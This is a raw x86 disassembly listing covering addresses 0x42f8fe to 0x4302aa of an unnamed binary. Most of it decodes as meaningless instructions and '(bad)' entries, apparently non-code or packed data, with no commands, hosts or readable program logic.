  42f8fe:	test   DWORD PTR [ecx+esi*4+0x3a],ebx
  42f902:	sbb    dh,BYTE PTR [ecx+0x1571672e]
  42f908:	xchg   BYTE PTR [edi],dh
  42f90a:	jp     0x42f909
  42f90c:	mov    ds:0xcd587ce2,al
	...
  42f971:	add    BYTE PTR [eax],al
  42f973:	add    BYTE PTR [esp+esi*2],dl
  42f976:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f977:	push   ebp
  42f978:	in     al,0xd5
  42f97a:	cmc    
  42f97b:	jne    0x42f928
  42f97d:	sbb    cl,dh
  42f97f:	js     0x42f91e
  42f981:	sbb    DWORD PTR fs:[edi+ebx*4+0x50001fe],eax
  42f989:	add    DWORD PTR [eax],eax
  42f98b:	add    BYTE PTR [edi-0x7a],cl
  42f98e:	jnp    0x42f939
  42f990:	pop    esi
  42f991:	out    0xe2,eax
  42f993:	mov    BYTE PTR [esi],dl
  42f995:	pop    esi
  42f996:	cld    
  42f997:	mov    eax,ds:0xa2dc3314
  42f99c:	mov    ah,0x8d
  42f99e:	sub    BYTE PTR [ebp+eax*8-0x19],ah
  42f9a2:	fnstsw WORD PTR ds:0x44c98fef
  42f9a8:	sbb    edi,ecx
  42f9aa:	jno    0x42f97c
  42f9ac:	and    al,0xc9
  42f9ae:	rol    BYTE PTR [ecx+0x67],0x3f
  42f9b2:	mov    dh,0xb7
  42f9b4:	inc    ebp
  42f9b5:	daa    
  42f9b6:	aaa    
  42f9b7:	mov    al,ds:0xc18b85bb
  42f9bc:	out    0x9d,eax
  42f9be:	(bad)  
  42f9bf:	cli    
  42f9c0:	mov    esp,0x84b247db
  42f9c5:	dec    edi
  42f9c6:	in     al,dx
  42f9c7:	jl     0x42f9c7
  42f9c9:	and    BYTE PTR [edi-0x60acc5ae],bl
  42f9cf:	adc    edi,edi
  42f9d1:	iret   
  42f9d2:	repnz out dx,al
  42f9d4:	aam    0x42
  42f9d6:	cmp    BYTE PTR [ecx+0x56],ah
  42f9d9:	add    edx,DWORD PTR [esi-0x27]
  42f9dc:	call   0x61ac9398
  42f9e1:	out    0xba,eax
  42f9e3:	inc    eax
  42f9e4:	jb     0x42f9e0
  42f9e6:	adc    dh,BYTE PTR [edi+0x61f4b86d]
  42f9ec:	mov    eax,ds:0xed9e72b2
  42f9f1:	fwait
  42f9f2:	addr16 mov esp,0x8ad6349e
  42f9f8:	xor    al,0xca
  42f9fa:	mov    ch,0x8b
  42f9fc:	loope  0x42f9d0
  42f9fe:	cs aas 
  42fa00:	pop    esp
  42fa01:	sahf   
  42fa02:	test   DWORD PTR [eax-0x4b],0x32aaf4b2
  42fa09:	lds    esp,FWORD PTR fs:[esi-0x4b]
  42fa0d:	jecxz  0x42fa1f
  42fa0f:	das    
  42fa10:	rcr    BYTE PTR [edi],0xba
  42fa13:	inc    ebx
  42fa14:	ror    edi,1
  42fa16:	xor    al,0xd
  42fa18:	mov    ebp,0x69ed8d5f
  42fa1d:	jno    0x42fa4c
  42fa1f:	das    
  42fa20:	mov    bh,0xcb
  42fa22:	and    DWORD PTR [edx+0x20],ebx
  42fa25:	add    DWORD PTR [edx+esi*2+0x2e2f6274],edx
  42fa2c:	xor    eax,0xcc5a4c37
  42fa31:	or     edx,DWORD PTR [esi+edi*8-0x2]
  42fa35:	pop    es
  42fa36:	int    0xf9
  42fa38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fa39:	mov    bl,0xc5
  42fa3b:	push   edi
  42fa3c:	cs dec esi
  42fa3e:	add    ecx,DWORD PTR [eax]
  42fa40:	rcr    DWORD PTR [bp+di],1
  42fa43:	mov    al,0xea
  42fa45:	push   edx
  42fa46:	pop    eax
  42fa47:	shl    dh,1
  42fa49:	daa    
  42fa4a:	dec    edi
  42fa4b:	mov    al,0xc3
  42fa4d:	popf   
  42fa4e:	push   ecx
  42fa4f:	pop    ebp
  42fa50:	scas   al,BYTE PTR es:[edi]
  42fa51:	cmp    bh,al
  42fa53:	inc    ebp
  42fa54:	cmp    BYTE PTR [ebx-0x2d],dl
  42fa57:	xchg   ebx,eax
  42fa58:	xchg   ebp,eax
  42fa59:	leave  
  42fa5a:	push   ebp
  42fa5b:	jbe    0x42faaa
  42fa5d:	mov    ds:0x26194f58,eax
  42fa62:	xchg   DWORD PTR [edi+0x14],esi
  42fa65:	mov    ch,0x5b
  42fa67:	daa    
  42fa68:	cmp    eax,0xdc814ccc
  42fa6d:	or     al,0xe0
  42fa6f:	inc    ebx
  42fa70:	push   0x50
  42fa72:	cmp    DWORD PTR [ecx-0x72],esp
  42fa75:	mov    cl,0x9c
  42fa77:	dec    ebx
  42fa78:	jae    0x42faac
  42fa7a:	call   0x7e16:0xc2b19c32
  42fa81:	into   
  42fa82:	xchg   edi,eax
  42fa83:	add    al,0x63
  42fa85:	hlt    
  42fa86:	push   es
  42fa87:	cmc    
  42fa88:	push   cs
  42fa89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fa8a:	mov    WORD PTR [esp+ebx*2],es
  42fa8d:	add    edx,0x88f7
	...
  42faf3:	add    BYTE PTR [ebx],bl
  42faf5:	out    dx,eax
  42faf6:	shl    BYTE PTR [esi],0xf4
  42faf9:	aas    
  42fafa:	(bad)  
  42fafb:	out    dx,eax
  42fafc:	int3   
  42fafd:	mov    WORD PTR [edi+0x32],?
  42fb00:	ins    BYTE PTR es:[edi],dx
  42fb01:	jle    0x42fab0
  42fb03:	aam    0xa4
  42fb05:	inc    DWORD PTR [ecx]
  42fb07:	add    BYTE PTR ds:0x2000001,al
  42fb0d:	stos   BYTE PTR es:[edi],al
  42fb0e:	or     BYTE PTR [edi],bl
  42fb10:	enter  0x9bba,0xa0
  42fb14:	dec    ebx
  42fb15:	icebp  
  42fb16:	xor    eax,DWORD PTR [edi-0x7db97ee7]
  42fb1c:	ins    BYTE PTR es:[edi],dx
  42fb1d:	xor    cl,BYTE PTR [ebp+0x77858fa7]
  42fb23:	adc    al,0x55
  42fb25:	(bad)  
  42fb27:	xor    ebp,0x85ded69c
  42fb2d:	stos   BYTE PTR es:[edi],al
  42fb2e:	lods   eax,DWORD PTR ds:[esi]
  42fb2f:	and    al,0x6f
  42fb31:	mov    dh,BYTE PTR [ecx]
  42fb33:	mov    bh,0xbe
  42fb35:	and    al,0xe8
  42fb37:	ds and eax,0x73f60799
  42fb3d:	push   ss
  42fb3e:	jle    0x42fb85
  42fb40:	and    al,0x7e
  42fb42:	pop    ecx
  42fb43:	push   ss
  42fb44:	arpl   WORD PTR [esi+0x44e5c8f4],cx
  42fb4a:	xor    cl,BYTE PTR [esi-0x60]
  42fb4d:	add    cl,al
  42fb4f:	iret   
  42fb50:	sbb    bl,BYTE PTR [ecx]
  42fb52:	inc    edx
  42fb53:	bound  esp,QWORD PTR [ebp+0x9]
  42fb56:	fadd   QWORD PTR [esi+0x5819cca0]
  42fb5c:	sub    BYTE PTR [ebp-0x69],0xbd
  42fb60:	cmp    esi,edi
  42fb62:	and    ebx,0x59128f1d
  42fb68:	aad    0x33
  42fb6a:	or     eax,0xa48f74f5
  42fb6f:	scas   al,BYTE PTR es:[edi]
  42fb70:	cs clc 
  42fb72:	push   ecx
  42fb73:	sbb    al,0x74
  42fb75:	pop    ss
  42fb76:	aas    
  42fb77:	mov    ch,0xc8
  42fb79:	xchg   BYTE PTR [ecx+0x44],ch
  42fb7c:	into   
  42fb7d:	std    
  42fb7e:	repz or al,0xc7
  42fb81:	inc    ebx
  42fb82:	pop    esi
  42fb83:	cmp    ch,BYTE PTR [ecx+0x5e]
  42fb86:	sub    BYTE PTR gs:[ebp-0x5eb90e65],al
  42fb8d:	xchg   edx,eax
  42fb8e:	loope  0x42fb26
  42fb90:	jmp    0x42fbc8
  42fb92:	in     al,dx
  42fb93:	mov    WORD PTR [edx],?
  42fb95:	loop   0x42fb30
  42fb97:	xchg   esi,eax
  42fb98:	inc    esi
  42fb99:	lea    edi,[ecx+0x28ca2c6]
  42fb9f:	sub    ebx,DWORD PTR [eax+0x54dbb7b2]
  42fba5:	inc    edi
  42fba6:	xor    DWORD PTR [edx-0x7d0b5a78],ebx
  42fbac:	mov    ds:0xeabd6a95,al
  42fbb1:	and    DWORD PTR [edi],eax
  42fbb3:	dec    DWORD PTR [edi]
  42fbb5:	imul   ebx,DWORD PTR [eax+ebp*1+0x56],0xe58ff1a8
  42fbbd:	jl     0x42fb96
  42fbbf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fbc0:	arpl   bx,si
  42fbc2:	push   0xd7a50343
  42fbc7:	mov    ebx,0x8b81a118
  42fbcc:	repz cwde 
  42fbce:	jecxz  0x42fbb3
  42fbd0:	xchg   esp,eax
  42fbd1:	jno    0x42fb5e
  42fbd3:	jbe    0x42fbd3
  42fbd5:	shr    DWORD PTR [edi+0x128c2c92],1
  42fbdb:	cmp    bl,BYTE PTR [edi]
  42fbdd:	or     BYTE PTR [esi+0x3b],bl
  42fbe0:	mov    dl,0xa6
  42fbe2:	arpl   cx,bx
  42fbe4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fbe5:	cli    
  42fbe6:	xor    bh,BYTE PTR ds:[edi]
  42fbe9:	int    0xbb
  42fbeb:	add    ebp,DWORD PTR [ecx]
  42fbed:	ret    
  42fbee:	add    BYTE PTR [edx-0x3d],bl
  42fbf1:	int3   
  42fbf2:	daa    
  42fbf3:	push   ebp
  42fbf4:	inc    ebx
  42fbf5:	pop    eax
  42fbf6:	(bad)  
  42fbf7:	call   0x91cf:0x435145a4
  42fbfe:	add    BYTE PTR [ebx+0x0],0x7a
  42fc02:	sbb    ebx,0x6d4c186b
  42fc08:	jle    0x42fc02
  42fc0a:	inc    esi
  42fc0b:	add    esp,DWORD PTR [esi+0x25]
  42fc0e:	xor    DWORD PTR es:[esi+0x0],ebx
	...
  42fc72:	add    BYTE PTR [eax],al
  42fc74:	or     ecx,DWORD PTR [eax+0x3ba319a3]
  42fc7a:	mov    ebx,0x36325e9a
  42fc7f:	and    BYTE PTR [edi-0x56aa089b],bl
  42fc85:	add    BYTE PTR [edx],al
  42fc87:	add    BYTE PTR ds:0x27000001,al
  42fc8d:	push   edi
  42fc8e:	ins    DWORD PTR es:[edi],dx
  42fc8f:	mov    ?,WORD PTR [ebx+0x195558f2]
  42fc95:	sub    al,0xbb
  42fc97:	push   ecx
  42fc98:	repnz and DWORD PTR [ebx],eax
  42fc9b:	xchg   esi,eax
  42fc9c:	mov    ebp,0x671c35d1
  42fca1:	out    dx,eax
  42fca2:	pop    ss
  42fca3:	jns    0x42fc8b
  42fca5:	sub    bh,0xd9
  42fca8:	add    cl,BYTE PTR [edx+0x1bbfa695]
  42fcae:	ret    0xc529
  42fcb1:	(bad)  
  42fcb2:	xor    eax,0x176c0bf1
  42fcb7:	(bad)  
  42fcb8:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fcba:	test   al,0x64
  42fcbc:	or     DWORD PTR [ebx+0x662100d9],edx
  42fcc2:	fwait
  42fcc3:	div    BYTE PTR [edi]
  42fcc5:	or     BYTE PTR [ecx-0x511eea44],bl
  42fccb:	(bad)  
  42fccc:	adc    DWORD PTR [edx+edx*2],edi
  42fccf:	pop    ds
  42fcd0:	pop    eax
  42fcd1:	xor    al,0x26
  42fcd3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fcd4:	pusha  
  42fcd5:	sar    edx,cl
  42fcd7:	imul   esi,esi,0x756d8b2
  42fcdd:	mov    ebp,DWORD PTR [edx]
  42fcdf:	inc    esp
  42fce0:	js     0x42fcc9
  42fce2:	push   ss
  42fce3:	inc    edx
  42fce4:	gs into 
  42fce6:	jno    0x42fc69
  42fce8:	scas   al,BYTE PTR es:[edi]
  42fce9:	into   
  42fcea:	jecxz  0x42fc9a
  42fcec:	jmp    0x42fce0
  42fcee:	mov    al,0xf1
  42fcf0:	inc    ecx
  42fcf1:	pop    ecx
  42fcf2:	pop    edx
  42fcf3:	sbb    edi,DWORD PTR [edx-0x7832b20a]
  42fcf9:	mov    ds:0x10b1a18d,eax
  42fcfe:	mov    dh,0xb0
  42fd00:	inc    edx
  42fd01:	cmp    ah,bl
  42fd03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fd04:	test   al,0xb3
  42fd06:	idiv   BYTE PTR [edx]
  42fd08:	jmp    0x5a272ea8
  42fd0d:	adc    BYTE PTR [ebx+0x3a54a1b4],dl
  42fd13:	mov    bh,0x26
  42fd15:	sub    al,0x2e
  42fd17:	loop   0x42fd1f
  42fd19:	push   edi
  42fd1a:	inc    edi
  42fd1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fd1c:	aaa    
  42fd1d:	adc    al,0xc8
  42fd1f:	data16 mov cl,0x12
  42fd22:	mov    ah,0xc0
  42fd24:	inc    edx
  42fd25:	loope  0x42fd19
  42fd27:	sbb    edi,DWORD PTR ds:0xd3b50e1b
  42fd2d:	inc    ecx
  42fd2e:	fwait
  42fd2f:	imul   ecx,DWORD PTR [edx+0x54],0xffffffbe
  42fd33:	jecxz  0x42fd0a
  42fd35:	push   ss
  42fd36:	lock lods al,BYTE PTR ds:[esi]
  42fd38:	mov    ebp,0xe8465264
  42fd3d:	jbe    0x42fcef
  42fd3f:	cmc    
  42fd40:	dec    esp
  42fd41:	mov    bl,0x43
  42fd43:	into   
  42fd44:	fsubr  st,st(2)
  42fd46:	ja     0x42fdb9
  42fd48:	xor    dl,BYTE PTR [edx]
  42fd4a:	pop    ss
  42fd4b:	es retf 
  42fd4d:	or     BYTE PTR [edx-0x27],0x52
  42fd51:	mov    bh,0x2d
  42fd53:	out    0x25,eax
  42fd55:	ss sub bl,bl
  42fd58:	aad    0xef
  42fd5a:	push   ecx
  42fd5b:	(bad)  
  42fd5c:	hlt    
  42fd5d:	cmc    
  42fd5e:	jmp    0xd17d:0x74f7ddb0
  42fd65:	(bad)  
  42fd66:	out    dx,eax
  42fd67:	les    esp,FWORD PTR [edx-0xb331359]
  42fd6d:	pop    ebp
  42fd6e:	pop    ebp
  42fd6f:	sahf   
  42fd70:	pop    eax
  42fd71:	fsubp  st(7),st
  42fd73:	mov    DWORD PTR [eax],edx
  42fd75:	mov    bh,0x49
  42fd77:	pop    ds
  42fd78:	xchg   DWORD PTR [ebx+0x4808956a],ebp
  42fd7e:	aam    0xc7
  42fd80:	out    dx,eax
  42fd81:	mov    al,ds:0x3db0afcb
  42fd86:	repnz (bad) 
  42fd88:	xchg   ecx,eax
  42fd89:	std    
  42fd8a:	in     eax,0xb1
  42fd8c:	aad    0x9e
  42fd8e:	out    dx,eax
  42fd8f:	pop    ebp
  42fd90:	add    BYTE PTR [eax],0x0
	...
  42fdf3:	add    BYTE PTR [eax-0x40],cl
  42fdf6:	ret    0xcaf0
  42fdf9:	bnd jp 0x42fdf4
  42fdfc:	cmc    
  42fdfd:	inc    edx
  42fdfe:	stos   BYTE PTR es:[edi],al
  42fdff:	repz fs ret 0xfd7
  42fe04:	scas   al,BYTE PTR es:[edi]
  42fe05:	add    DWORD PTR [edx],eax
  42fe07:	add    BYTE PTR ds:0xf4000001,al
  42fe0d:	lds    ebp,FWORD PTR [ebp+0x5c]
  42fe10:	test   al,0xcc
  42fe12:	ret    
  42fe13:	iret   
  42fe14:	inc    esp
  42fe15:	inc    ecx
  42fe16:	inc    eax
  42fe17:	dec    esi
  42fe18:	mov    bh,0xbd
  42fe1a:	adc    ebp,DWORD PTR [ebp-0x6e]
  42fe1d:	pop    ebp
  42fe1e:	mov    DWORD PTR [eax],edx
  42fe20:	aam    0x12
  42fe22:	mov    edi,0xd872660
  42fe27:	mov    esi,0x8d98dd86
  42fe2c:	jp     0x42fe0a
  42fe2e:	and    eax,0x65248708
  42fe33:	stc    
  42fe34:	push   edx
  42fe35:	test   ebx,esi
  42fe37:	hlt    
  42fe38:	out    0x9d,al
  42fe3a:	leave  
  42fe3b:	sub    edx,edx
  42fe3d:	jmp    0x42fe09
  42fe3f:	scas   eax,DWORD PTR es:[edi]
  42fe40:	mov    dh,0x3a
  42fe42:	sar    BYTE PTR [esi+eiz*4-0x20],cl
  42fe46:	jl     0x42fe83
  42fe48:	mov    BYTE PTR [ebp-0x656e5f59],ah
  42fe4e:	cmp    eax,0x2d9cbcfc
  42fe53:	into   
  42fe54:	push   edx
  42fe55:	jl     0x42fe7b
  42fe57:	mov    ebp,0x310f6a21
  42fe5c:	(bad)  
  42fe5d:	xor    eax,DWORD PTR [ebx]
  42fe5f:	or     eax,0x22dd1254
  42fe64:	(bad)  
  42fe66:	xor    esi,DWORD PTR [edx+ebx*2+0x1411408a]
  42fe6d:	jge    0x42fe5e
  42fe6f:	push   edi
  42fe70:	out    0x9,al
  42fe72:	addr16 inc edi
  42fe74:	mov    edx,0x4813962b
  42fe79:	mov    al,ds:0x7529177b
  42fe7e:	cli    
  42fe7f:	dec    ebx
  42fe80:	push   esi
  42fe81:	out    0xbc,eax
  42fe83:	aad    0x5
  42fe85:	inc    edi
  42fe86:	(bad)  
  42fe87:	rcr    ch,1
  42fe89:	mov    dl,0x2a
  42fe8b:	or     eax,0x2f11ad2a
  42fe90:	(bad)  
  42fe91:	test   BYTE PTR [edx],0x6a
  42fe94:	in     al,0xc1
  42fe96:	repz in al,0xfb
  42fe99:	cmc    
  42fe9a:	mov    cl,0x8c
  42fe9c:	dec    edx
  42fe9d:	adc    DWORD PTR [edx-0x3006a19e],ecx
  42fea3:	jo     0x42ff21
  42fea5:	pop    es
  42fea6:	ret    
  42fea7:	inc    eax
  42fea8:	iret   
  42fea9:	jno    0x42feb1
  42feab:	cmp    al,0x5d
  42fead:	add    BYTE PTR [eax],cl
  42feaf:	and    bl,BYTE PTR [esi]
  42feb1:	or     DWORD PTR [esi-0x4],ecx
  42feb4:	push   eax
  42feb5:	cmp    al,0x3f
  42feb7:	les    edx,FWORD PTR [ebx-0x40c0ae03]
  42febd:	or     esp,DWORD PTR [esi]
  42febf:	stos   BYTE PTR es:[edi],al
  42fec0:	mov    cl,0xed
  42fec2:	aas    
  42fec3:	ficomp WORD PTR [ebx-0x5976085]
  42fec9:	in     al,dx
  42feca:	cmp    bh,bl
  42fecc:	inc    ecx
  42fecd:	or     ah,0x1d
  42fed0:	xor    ebp,0xffffffca
  42fed3:	daa    
  42fed4:	test   DWORD PTR [edx+0x6],0xcd432413
  42fedb:	add    dl,BYTE PTR [eax+0x63]
  42fede:	or     al,0xc
  42fee0:	or     esi,DWORD PTR [ebx+0x44fe45fc]
  42fee6:	xchg   ebx,eax
  42fee7:	mov    edi,0x6cd9ed16
  42feec:	hlt    
  42feed:	add    ah,BYTE PTR [ecx+edi*8-0x568b7af]
  42fef4:	les    ebp,FWORD PTR [eax-0x181d626d]
  42fefa:	pop    ebx
  42fefb:	(bad)
  42fefe:	cmp    edx,DWORD PTR [eax-0x271a59b]
  42ff04:	(bad)  
  42ff05:	out    dx,eax
  42ff06:	mov    bh,0x8d
  42ff08:	adc    al,BYTE PTR [edx]
  42ff0a:	loope  0x42ff19
  42ff0c:	sbb    BYTE PTR [eax+edi*2],dh
  42ff0f:	cmp    edx,DWORD PTR [eax]
	...
  42ff71:	add    BYTE PTR [eax],al
  42ff73:	add    BYTE PTR [edi+eiz*2],al
  42ff76:	std    
  42ff77:	aaa    
  42ff78:	(bad)  
  42ff79:	mov    edi,0x9ffa77ce
  42ff7e:	shl    DWORD PTR [ebx+esi*1-0xf],0xf8
  42ff83:	push   ecx
  42ff84:	mov    bl,0x2
  42ff86:	add    al,BYTE PTR [eax]
  42ff88:	cmc    
  42ff89:	add    BYTE PTR [eax],al
  42ff8b:	add    BYTE PTR [edi],bl
  42ff8d:	cs pop ecx
  42ff8f:	fcomp  DWORD PTR [ecx]
  42ff91:	aad    0x73
  42ff93:	push   esp
  42ff94:	or     eax,0xb80150fd
  42ff99:	xchg   ebp,eax
  42ff9a:	call   0xa289ed84
  42ff9f:	and    DWORD PTR [esi],esi
  42ffa1:	lahf   
  42ffa2:	jl     0x430008
  42ffa4:	dec    ecx
  42ffa5:	aad    0xb9
  42ffa7:	sbb    BYTE PTR [ecx+0x351e3663],al
  42ffad:	dec    esi
  42ffae:	jle    0x42ff51
  42ffb0:	xor    DWORD PTR [edi+0xf],edi
  42ffb3:	imul   ecx,esi,0x30c9c57c
  42ffb9:	adc    DWORD PTR [esi+0x6a],edi
  42ffbc:	jge    0x42ff65
  42ffbe:	(bad)  
  42ffbf:	repnz inc ebp
  42ffc1:	pop    ebp
  42ffc2:	aaa    
  42ffc3:	ja     0x42ff54
  42ffc5:	jecxz  0x42ff8c
  42ffc7:	jl     0x42ffaa
  42ffc9:	push   ebp
  42ffca:	lea    ebp,[edi]
  42ffcc:	sbb    bl,al
  42ffce:	mov    edi,0x8045e15
  42ffd3:	sub    BYTE PTR ds:0x5f9cc47c,dh
  42ffd9:	jecxz  0x42ff92
  42ffdb:	xchg   ecx,eax
  42ffdc:	and    eax,0x507651c6
  42ffe1:	mov    esp,DWORD PTR ds:0xf2732f7d
  42ffe7:	lahf   
  42ffe8:	je     0x42ffa5
  42ffea:	imul   DWORD PTR [ecx-0x23111be2]
  42fff0:	adc    edi,DWORD PTR [edx]
  42fff2:	out    0x8e,al
  42fff4:	mov    al,ds:0x6a2f72b7
  42fff9:	or     DWORD PTR [edi],0xffffffc0
  42fffc:	ins    DWORD PTR es:[edi],dx
  42fffd:	in     eax,dx
  42fffe:	es call 0x6698bc9a
  430004:	arpl   WORD PTR [ebx+0x7780d05d],dx
  43000a:	pop    edx
  43000b:	enter  0xb4c1,0x99
  43000f:	clc    
  430010:	add    ecx,DWORD PTR [esi+0xa046d0b]
  430016:	lods   eax,DWORD PTR ds:[esi]
  430017:	dec    eax
  430018:	xor    DWORD PTR ds:0x164177e9,eax
  43001e:	stos   DWORD PTR es:[edi],eax
  43001f:	sub    BYTE PTR [ecx],bl
  430021:	dec    ecx
  430022:	cs or  al,bh
  430025:	ret    
  430026:	(bad)  
  430027:	pop    ebp
  430028:	jbe    0x430091
  43002a:	data16 adc dh,BYTE PTR [ebx+0x4aa4c3f1]
  430031:	ficomp WORD PTR [edi-0x3bbc94e1]
  430037:	jg     0x430034
  430039:	mov    ds:0x452aa2b2,eax
  43003e:	sub    al,0xca
  430040:	and    DWORD PTR [eax-0x7c11c170],0x6c
  430047:	jge    0x430036
  430049:	or     dh,BYTE PTR [esp+esi*4]
  43004c:	call   0x8492516b
  430051:	cli    
  430052:	rol    esi,cl
  430054:	cmp    DWORD PTR [ebx+0x5c],ebp
  430057:	cmp    edi,esp
  430059:	jb     0x430023
  43005b:	ins    BYTE PTR es:[edi],dx
  43005c:	mov    al,ds:0xb02c6f5a
  430061:	out    dx,al
  430062:	mov    edi,ebx
  430064:	and    BYTE PTR [edx],0x89
  430067:	call   0xae34:0xf9126fe6
  43006e:	mov    bl,0x62
  430070:	retf   
  430071:	ficom  DWORD PTR [edi-0x9]
  430074:	mov    esi,es
  430076:	cmc    
  430077:	scas   al,BYTE PTR es:[edi]
  430078:	or     eax,0x90562394
  43007e:	pop    es
  43007f:	ret    
  430080:	pop    es
	...
  4300f1:	add    BYTE PTR [eax],al
  4300f3:	add    BYTE PTR [ebp+0x55],cl
  4300f6:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  4300fc:	mov    esp,ebp
  4300fe:	or     ah,dh
  430100:	dec    ebp
  430101:	add    bh,al
  430103:	add    BYTE PTR [eax],cl
  430105:	add    BYTE PTR [eax],al
  430107:	mov    DWORD PTR [eax],0x40f44545
  43010d:	xor    DWORD PTR [eax],eax
  43010f:	test   DWORD PTR [ebx-0x34070b64],ecx
  430115:	(bad)  
  430116:	enter  0x4d45,0xbc
  43011a:	mov    esi,DWORD PTR [edx]
  43011c:	hlt    
  43011d:	test   ebx,ecx
  43011f:	pushf  
  430120:	enter  0x4df8,0x8b
  430124:	mov    DWORD PTR [ebp+0x8],0x894708
  43012b:	inc    ebp
  43012c:	mov    ebp,0xff8bfffc
  430131:	dec    ebp
  430132:	mov    ch,0xf4
  430134:	call   DWORD PTR [ebx-0x1]
  430137:	mov    ebx,0x8005474
  43013c:	call   DWORD PTR [ecx+0x8]
  43013f:	pop    es
  430140:	jmp    0xb8:0xacb4533
  430147:	fwait
  430148:	mov    esi,DWORD PTR [edx-0xc]
  43014b:	xor    cl,bl
  43014d:	add    BYTE PTR [ebx+0x3c83203],bl
  430153:	mov    DWORD PTR [ecx+0x4dd0084d],ecx
  430159:	mov    eax,DWORD PTR [ebx-0xb9bb3]
  43015f:	xor    eax,DWORD PTR [eax]
  430161:	retf   
  430162:	retf   
  430163:	add    ecx,eax
  430165:	enter  0x894d,0x64
  430169:	dec    ebp
  43016a:	sbb    ah,cl
  43016c:	add    BYTE PTR [ebx-0xb9bb277],cl
  430172:	dec    DWORD PTR [ebx-0xbcfb275]
  430178:	test   DWORD PTR [ebx],esi
  43017a:	dec    ebx
  43017c:	inc    DWORD PTR [ebx]
  43017e:	inc    eax
  43017f:	enter  0x8989,0x50
  430183:	(bad)  
  430184:	call   DWORD PTR [ebx+ecx*4-0x1]
  430188:	cld    
  430189:	dec    DWORD PTR [ebp-0xa90001]
  43018f:	push   edi
  430190:	mov    BYTE PTR [edx+0x1],ch
  430193:	and    al,BYTE PTR [eax]
  430195:	pop    ecx
  430196:	inc    ebp
  430197:	mov    DWORD PTR [ebp-0xb2a7f8],ecx
  43019d:	push   0xffffff89
  43019f:	pop    ecx
  4301a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4301a1:	dec    ebp
  4301a2:	add    BYTE PTR [ecx+0x45fc088b],cl
  4301a8:	jne    0x4301f4
  4301aa:	lea    eax,[eax]
  4301ac:	push   eax
  4301ad:	(bad)  
  4301ae:	dec    DWORD PTR [eax]
  4301b0:	mov    DWORD PTR [eax],eax
  4301b2:	test   al,0x0
  4301b4:	add    BYTE PTR [ebp-0x18],cl
  4301b7:	xor    ebp,DWORD PTR [ebx]
  4301b9:	add    eax,DWORD PTR [eax]
  4301bb:	mov    eax,eax
  4301bd:	or     BYTE PTR [ebp+ecx*2+0x3003302],al
  4301c4:	inc    ebp
  4301c5:	mov    DWORD PTR [ebx+0x459408],ecx
  4301cb:	arpl   WORD PTR [ebx-0x372749b],cx
  4301d1:	sub    al,0x80
  4301d3:	inc    DWORD PTR [ecx]
  4301d5:	lea    eax,[eax]
  4301d7:	or     al,0x0
  4301d9:	inc    DWORD PTR [ecx-0x18]
  4301dc:	mov    ecx,DWORD PTR [ebx]
  4301de:	cld    
  4301df:	add    BYTE PTR [ecx+0x75014d],cl
  4301e5:	(bad)  
  4301e6:	xchg   ebp,eax
  4301e7:	fdivr  st,st(7)
  4301e9:	inc    eax
  4301ea:	inc    DWORD PTR [eax]
  4301ec:	mov    ecx,DWORD PTR [ebp-0x4]
  4301ef:	xor    edx,DWORD PTR [edx+0x7201b8]
  4301f5:	add    BYTE PTR [edx],dl
  4301f7:	enter  0x4d90,0x0
  4301fb:	mov    eax,DWORD PTR [eax]
  4301fd:	hlt    
  4301fe:	add    al,0xa5
  430200:	mov    al,0xff
  430202:	add    bh,bh
  430204:	add    BYTE PTR [ebx],dh
  430206:	inc    DWORD PTR [ebx]
  430208:	sbb    al,0x89
  43020a:	jne    0x4301e8
  43020c:	mov    esp,DWORD PTR [ecx+0x4500fc]
  430212:	mov    eax,DWORD PTR [ebp-0xff0048]
  430218:	mov    DWORD PTR [eax-0x70],0xec58ed89
  43021f:	inc    DWORD PTR [ebp-0x75]
  430222:	fisttp QWORD PTR [esi+ebp*8]
  430225:	test   DWORD PTR [esi-0x1],esp
  430228:	inc    ebp
  430229:	(bad)  
  43022a:	aas    
  43022b:	inc    ebp
  43022c:	(bad)  
  43022d:	lea    edi,[esp+eiz*2-0x1]
  430231:	inc    edi
  430233:	mov    DWORD PTR ds:0x8000c7a0,edi
  430239:	mov    ebp,esp
  43023b:	cld    
  43023c:	loop   0x4301cb
  43023e:	inc    ebp
  43023f:	(bad)  
  430240:	out    dx,al
  430241:	(bad)  
  430242:	fisttp WORD PTR [eax+0x8801c7]
  430248:	jecxz  0x43028f
  43024a:	in     al,dx
  43024b:	inc    DWORD PTR [ebp-0x4]
  43024e:	out    0x8d,eax
  430250:	aas    
  430251:	inc    edi
  430253:	jmp    FWORD PTR [eax-0x78]
  430256:	inc    DWORD PTR [ecx]
  430258:	mov    DWORD PTR [eax],0xc7043d
  43025e:	ins    BYTE PTR es:[edi],dx
  43025f:	test   edi,edi
  430261:	pandn  mm0,mm5
  430264:	aas    
  430265:	add    bh,al
  430267:	mov    esi,DWORD PTR [eax-0x4]
  43026a:	inc    DWORD PTR [eax+0xdf01ee]
  430270:	(bad)  
  430271:	or     BYTE PTR [ebp+eax*2-0x1],dh
  430275:	mov    ebp,ebx
  430277:	xchg   esp,eax
  430278:	fild   DWORD PTR [eax]
  43027a:	(bad)  
  43027b:	mov    edi,DWORD PTR [eax+0x3]
  43027e:	(bad)  
  43027f:	cmp    al,0xe7
  430281:	dec    ebp
  430282:	leave  
  430283:	mov    ebp,eax
  430285:	fsubr  DWORD PTR [edx]
  430287:	add    BYTE PTR [eax],al
  430289:	lea    ecx,[ebx-0x7f0003b4]
  43028f:	push   edx
  430290:	add    DWORD PTR [ebp+0x0],edx
  430293:	mov    esi,DWORD PTR [eax]
  430295:	mov    WORD PTR [edi],ss
  430297:	add    BYTE PTR [eax],al
  430299:	mov    eax,DWORD PTR [ebp-0x74778afd]
  43029f:	add    ah,bh
  4302a1:	push   0x7d
  4302a3:	dec    DWORD PTR [ebx+0xd88c]
  4302a9:	push   edx
  4302aa:	mov    edx,DWORD PTR [ecx-0x4]
